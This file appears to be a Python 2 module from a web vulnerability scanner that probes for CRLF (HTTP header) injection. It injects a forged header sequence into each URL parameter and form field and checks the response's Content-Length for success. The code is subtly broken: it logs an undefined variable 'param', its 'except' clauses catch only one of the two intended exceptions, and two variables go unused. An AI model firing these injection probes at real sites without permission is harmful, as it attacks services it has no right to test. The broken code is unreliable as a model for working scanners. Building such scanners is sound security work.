from utils import dict_iterate, modify_parameter, update_url_params, get_url_query
from client import NotAPage, RedirectedToExternal

BODY = u'o'
CLRF_SEQUENCE = (
    u"Content-Type: text/html\r\n" +
    u"Content-Length: %d\r\n\r\n" % len(BODY))
ATTACK_SEQUENCE = CLRF_SEQUENCE + BODY

def clrf(page, client, log):
    attack_url(page.url, client, log)

    for form in page.get_forms():
        parameters = dict(form.get_parameters())
        for parameter in parameters:
            injected_parameters = modify_parameter(parameters, parameter, ATTACK_SEQUENCE)

            try:
                res_page = form.send(client, injected_parameters)
            except NotAPage, RedirectedToExternal:
                continue

            if check_clrf(res_page):
                log('vuln', 'clrf', form.action, param)


def attack_url(url, client, log):
    query = get_url_query(url)
    report = {}

    for param, value in dict_iterate(query):
        successed = []
        injected_url = update_url_params(url, {param: ATTACK_SEQUENCE})

        try:
            res_page = client.get(injected_url)
        except NotAPage, RedirectedToExternal:
            continue

        if check_clrf(res_page):
            log('vuln', 'clrf', url, param)

def check_clrf(res_page):
    return res_page.headers.get('Content-Length') == str(len(BODY))